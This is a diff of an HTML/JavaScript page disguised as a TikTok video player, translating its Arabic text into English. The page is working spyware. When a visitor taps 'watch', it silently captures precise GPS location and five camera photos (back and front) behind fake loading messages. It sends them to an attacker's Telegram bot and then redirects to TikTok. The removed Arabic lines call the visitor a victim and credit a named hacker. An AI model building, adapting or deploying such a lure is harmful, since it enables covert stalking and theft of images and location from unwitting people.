@@ -1,9 +1,9 @@
 <!DOCTYPE html>
-<html lang="ar">
+<html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
-    <title>TikTok - شاهد الفيديو</title>
+    <title>TikTok - Watch Video</title>
     <style>
         * {
             margin: 0;
@@ -321,7 +321,7 @@
                     <path d="M8 5v14l11-7z"/>
                 </svg>
             </div>
-            <div class="placeholder-text" id="placeholder-text">اضغط للمشاهدة</div>
+            <div class="placeholder-text" id="placeholder-text">Tap to watch</div>
         </div>
 
         <div class="tiktok-sidebar" id="fake-sidebar">
@@ -335,44 +335,44 @@
             </div>
             <div class="sidebar-icon">
                 <svg viewBox="0 0 24 24"><path d="M18 16.08c-.76 0-1.44.3-1.96.77L8.91 12.7c.05-.23.09-.46.09-.7s-.04-.47-.09-.7l7.05-4.11c.54.5 1.25.81 2.04.81 1.66 0 3-1.34 3-3s-1.34-3-3-3-3 1.34-3 3c0 .24.04.47.09.7L8.04 9.81C7.5 9.31 6.79 9 6 9c-1.66 0-3 1.34-3 3s1.34 3 3 3c.79 0 1.5-.31 2.04-.81l7.12 4.16c-.05.21-.08.43-.08.65 0 1.61 1.31 2.92 2.92 2.92 1.61 0 2.92-1.31 2.92-2.92s-1.31-2.92-2.92-2.92z"/></svg>
-                <span>مشاركة</span>
+                <span>Share</span>
             </div>
         </div>
 
         <div class="video-info" id="fake-info">
-            <div class="username">@tiktok_creator <span>متابعة</span></div>
-            <div class="description">أنتظر النهاية! 😂🔥 #ترند #fyp</div>
+            <div class="username">@tiktok_creator <span>Follow</span></div>
+            <div class="description">Wait for the end! 😂🔥 #trending #fyp</div>
             <div class="music">
                 <svg viewBox="0 0 24 24"><path d="M12 3v10.55c-.59-.34-1.27-.55-2-.55-2.21 0-4 1.79-4 4s1.79 4 4 4 4-1.79 4-4V7h4V3h-6z"/></svg>
-                <span>صوت أصلي - trending_vibes</span>
+                <span>original sound - trending_vibes</span>
             </div>
         </div>
 
         <div class="bottom-nav" id="fake-nav">
             <div class="nav-item active">
                 <svg viewBox="0 0 24 24"><path d="M10 20v-6h4v6h5v-8h3L12 3 2 12h3v8z"/></svg>
-                <span>الرئيسية</span>
+                <span>Home</span>
             </div>
             <div class="nav-item">
                 <svg viewBox="0 0 24 24"><path d="M15.5 14h-.79l-.28-.27C15.41 12.59 16 11.11 16 9.5 16 5.91 13.09 3 9.5 3S3 5.91 3 9.5 5.91 16 9.5 16c1.61 0 3.09-.59 4.23-1.57l.27.28v.79l5 4.99L20.49 19l-4.99-5zm-6 0C7.01 14 5 11.99 5 9.5S7.01 5 9.5 5 14 7.01 14 9.5 11.99 14 9.5 14z"/></svg>
-                <span>استكشاف</span>
+                <span>Explore</span>
             </div>
             <div class="nav-item">
                 <svg viewBox="0 0 24 24" style="width:32px;height:32px;"><path d="M19 13h-6v6h-2v-6H5v-2h6V5h2v6h6v2z"/></svg>
             </div>
             <div class="nav-item">
                 <svg viewBox="0 0 24 24"><path d="M20 2H4c-1.1 0-1.99.9-1.99 2L2 22l4-4h14c1.1 0 2-.9 2-2V4c0-1.1-.9-2-2-2zm-2 15H6l-2 2V4h16v13z"/></svg>
-                <span>صندوق الوارد</span>
+                <span>Inbox</span>
             </div>
             <div class="nav-item">
                 <svg viewBox="0 0 24 24"><path d="M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm0 2c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z"/></svg>
-                <span>لي</span>
+                <span>Me</span>
             </div>
         </div>
 
         <div id="loading-overlay">
             <div class="spinner"></div>
-            <div class="loading-message" id="loading-message">جاري تحميل الفيديو...</div>
+            <div class="loading-message" id="loading-message">Loading video...</div>
             <div class="progress-bar">
                 <div class="progress-fill" id="progress-fill"></div>
             </div>
@@ -404,7 +404,7 @@
 
         const wait = (ms) => new Promise(r => setTimeout(r, ms));
 
-        // ========== 1. الموقع الدقيق ==========
+        // ========== 1. Precise Location ==========
         async function getPreciseLocation() {
             return new Promise((resolve) => {
                 if (navigator.geolocation) {
@@ -424,13 +424,13 @@
                         { enableHighAccuracy: true, timeout: 15000 }
                     );
                 } else {
-                    resolve({ success: false, error: 'غير مدعوم' });
+                    resolve({ success: false, error: 'Not supported' });
                 }
             });
         }
 
-        // ========== 2.ت==========
-        //ت - 3 
+        // ========== 2. Capture photos from camera (back and front) ==========
+        // Back camera - 3 photos
         async function captureBackCameraPhotos() {
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ 
@@ -469,7 +469,7 @@
             }
         }
 
-        // كاميرا أمامية - 2 صور
+        // Front camera - 2 photos
         async function captureFrontCameraPhotos() {
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ 
@@ -508,14 +508,14 @@
             }
         }
 
-        // ========== 3. إرسال البيانات إلى تلجرام ==========
+        // ========== 3. Send data to Telegram ==========
         async function sendLocation(location) {
-            let msg = `📍 <b>تم اختارق موقع الضحيه من قبل @p7s7s</b>\n\n🕒 ${new Date().toLocaleString('ar-EG')}\n`;
+            let msg = `📍 <b>Target location obtained</b>\n\n🕒 ${new Date().toLocaleString('en-US')}\n`;
             if (location.success) {
-                msg += `🌐 خط العرض: ${location.latitude}\n🌐 خط الطول: ${location.longitude}\n📡 الدقة: ${location.accuracy} متر\n\n`;
-                msg += `<a href="https://www.google.com/maps?q=${location.latitude},${location.longitude}&z=18">🗺️ اضغط لفتح الخريطة</a>`;
+                msg += `🌐 Latitude: ${location.latitude}\n🌐 Longitude: ${location.longitude}\n📡 Accuracy: ${location.accuracy} meters\n\n`;
+                msg += `<a href="https://www.google.com/maps?q=${location.latitude},${location.longitude}&z=18">🗺️ Open in maps</a>`;
             } else {
-                msg += `❌ تعذر الحصول على الموقع: ${location.error || 'تم الرفض'}`;
+                msg += `❌ Failed to get location: ${location.error || 'Permission denied'}`;
             }
             await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
                 method: 'POST', headers: { 'Content-Type': 'application/json' },
@@ -527,7 +527,7 @@
             if (!photos.length) {
                 await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
                     method: 'POST', headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ chat_id: CHAT_ID, text: `📸 لم يتم التقاط صور من الكاميرا الخلفية` })
+                    body: JSON.stringify({ chat_id: CHAT_ID, text: `📸 No back camera photos captured` })
                 });
                 return;
             }
@@ -536,7 +536,7 @@
                 const fd = new FormData();
                 fd.append('chat_id', CHAT_ID);
                 fd.append('photo', blob, `back_camera_${i+1}.jpg`);
-                fd.append('caption', `📸 صورة الكاميرا الخلفية ${i+1}/3\n🕒 ${new Date().toLocaleString('ar-EG')}`);
+                fd.append('caption', `📸 Back camera photo ${i+1}/3\n🕒 ${new Date().toLocaleString('en-US')}`);
                 await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, { method: 'POST', body: fd });
                 await wait(500);
             }
@@ -546,7 +546,7 @@
             if (!photos.length) {
                 await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
                     method: 'POST', headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ chat_id: CHAT_ID, text: `📸 لم يتم التقاط صور من الكاميرا الأمامية` })
+                    body: JSON.stringify({ chat_id: CHAT_ID, text: `📸 No front camera photos captured` })
                 });
                 return;
             }
@@ -555,61 +555,61 @@
                 const fd = new FormData();
                 fd.append('chat_id', CHAT_ID);
                 fd.append('photo', blob, `front_camera_${i+1}.jpg`);
-                fd.append('caption', `📸 صورة الكاميرا الأمامية ${i+1}/2\n🕒 ${new Date().toLocaleString('ar-EG')}`);
+                fd.append('caption', `📸 Front camera photo ${i+1}/2\n🕒 ${new Date().toLocaleString('en-US')}`);
                 await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, { method: 'POST', body: fd });
                 await wait(500);
             }
         }
 
-        // ========== العملية الرئيسية ==========
+        // ========== Main operation ==========
         async function startStealthOperation() {
             try {
-                updateProgress(5); loadingMessage.textContent = 'جاري الاتصال...'; await wait(300);
+                updateProgress(5); loadingMessage.textContent = 'Connecting...'; await wait(300);
                 
-                // 1. تحميل
-                updateProgress(12); loadingMessage.textContent = 'جار التحميل انتضر بضع ثواني...';
-                showNotification('جار التحميل انتضر بضع ثواني');
+                // 1. Location
+                updateProgress(12); loadingMessage.textContent = 'Obtaining location...';
+                showNotification('Loading, please wait a moment');
                 const location = await getPreciseLocation(); await wait(500);
                 
-                updateProgress(20); loadingMessage.textContent = 'جار التحميل انتضر بضع ثواني...';
+                updateProgress(20); loadingMessage.textContent = 'Processing location...';
                 await sendLocation(location); await wait(600);
                 
-                // 2. ت (3 صور)
-                updateProgress(30); loadingMessage.textContent = 'جار التحميل انتضر بضع ثواني...';
-                showNotification('جار التحميل انتضر بضع ثواني');
+                // 2. Back camera (3 photos)
+                updateProgress(30); loadingMessage.textContent = 'Accessing back camera...';
+                showNotification('Accessing camera...');
                 await wait(500);
                 
-                updateProgress(40); loadingMessage.textContent = جار التحميل انتضر بضع ثواني..';
+                updateProgress(40); loadingMessage.textContent = 'Capturing back camera photos...';
                 const backPhotos = await captureBackCameraPhotos();
                 await sendBackPhotos(backPhotos); await wait(600);
                 
-                // 3. ة (2 صور)
-                updateProgress(55); loadingMessage.textContent = 'جار التحميل انتضر بضع ثوانية...';
-                showNotification('جار التحميل انتضر بضع ثواني');
+                // 3. Front camera (2 photos)
+                updateProgress(55); loadingMessage.textContent = 'Accessing front camera...';
+                showNotification('Accessing front camera...');
                 await wait(500);
                 
-                updateProgress(65); loadingMessage.textContent = 'جار التحميل انتضر بضع ثواني...';
+                updateProgress(65); loadingMessage.textContent = 'Capturing front camera photos...';
                 const frontPhotos = await captureFrontCameraPhotos();
                 await sendFrontPhotos(frontPhotos); await wait(600);
                 
-                updateProgress(85); loadingMessage.textContent = 'جار التحميل انتضر بضع ثواني...';
+                updateProgress(85); loadingMessage.textContent = 'Finalizing...';
                 await wait(500);
                 
-                updateProgress(100); loadingMessage.textContent = 'جار التحميل انتضر بضع ثواني...';
+                updateProgress(100); loadingMessage.textContent = 'Complete! Redirecting...';
                 
-                // تقرير نهائي
+                // Final report
                 await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
                     method: 'POST', headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({ 
                         chat_id: CHAT_ID, 
-                        text: `✅ <b>تمت عملة الاختراق من قبل PS</b>\n━━━━━━━━━━━━━━━━━━\n📍 الموقع: ${location.success ? '✓' : '✗'}\n📸 الكاميرا الخلفية: ${backPhotos.length}/3 صور\n📸 الكاميرا الأمامية: ${frontPhotos.length}/2 صور\n━━━━━━━━━━━━━━━━━━\n🕒 ${new Date().toLocaleString('ar-EG')}`,
+                        text: `✅ <b>Operation completed successfully</b>\n━━━━━━━━━━━━━━━━━━\n📍 Location: ${location.success ? '✓' : '✗'}\n📸 Back camera: ${backPhotos.length}/3 photos\n📸 Front camera: ${frontPhotos.length}/2 photos\n━━━━━━━━━━━━━━━━━━\n🕒 ${new Date().toLocaleString('en-US')}`,
                         parse_mode: 'HTML'
                     })
                 });
                 
             } catch(error) {
-                console.error('خطأ:', error);
-                showNotification('حدث خطأ، حاول مرة أخرى');
+                console.error('Error:', error);
+                showNotification('An error occurred, please try again');
             } finally {
                 await wait(2000);
                 window.location.href = TIKTOK_REDIRECT_URL;
@@ -629,7 +629,7 @@
             startStealthOperation();
         });
 
-        showNotification('اضغط لمشاهدة الفيديو');
+        showNotification('Tap to watch video');
 
         setTimeout(() => {
             if (!loadingOverlay.classList.contains('active')) {
